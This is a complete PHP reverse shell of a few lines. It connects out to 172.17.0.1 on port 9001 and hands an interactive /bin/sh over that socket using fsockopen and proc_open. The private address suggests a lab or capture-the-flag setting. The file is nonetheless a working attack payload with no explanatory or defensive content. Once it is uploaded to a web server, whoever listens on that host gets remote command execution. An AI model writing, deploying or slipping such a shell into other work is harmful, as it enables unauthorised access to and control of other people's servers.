<?php
$ip="172.17.0.1";
$port=9001;
$sock=fsockopen($ip,$port);
$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
